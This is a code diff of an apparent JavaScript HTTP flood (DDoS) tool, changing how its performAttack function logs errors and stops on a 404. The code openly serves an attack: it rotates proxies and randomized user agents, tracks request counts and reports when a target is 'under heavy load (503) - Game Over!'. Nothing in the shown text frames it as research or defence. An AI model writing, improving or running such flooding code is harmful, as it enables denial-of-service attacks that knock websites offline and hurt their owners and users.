@@ -114,8 +114,7 @@ const loadProxies = () => {
 
 const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
     if (!continueAttack) return;
-    console.clear();
-
+    
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": sanitizeUA(getRandomElement(userAgents())),
@@ -188,19 +187,20 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
             err.code === "EAI_AGAIN" ||
             err.message === "Socket is closed"
         ) {
-            console.log(rainbow("Unable to Attack Target Server Refused!"));
+           // console.log(rainbow("Unable to Attack Target Server Refused!"));
         } else if (err.response?.status === 404) {
             console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+            continueAttack = false;
         } else if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503) - Game Over!"));
         } else if (err.response?.status === 502) {
             console.log(rainbow("Bad Gateway (502)."));
         } else if (err.response?.status === 403) {
-            console.log(rainbow("Forbidden (403)."));
+          //  console.log(rainbow("Forbidden (403)."));
         } else if (err.response?.status) {
-            console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+         //   console.log(rainbow(`DDOS Status: (${err.response?.status})`));
         } else {
-            console.log(rainbow(err.message || "ATTACK FAILED!"));
+          //  console.log(rainbow(err.message || "ATTACK FAILED!"));
         }
         requestsSent++;
         checkCompletion(requestsSent);
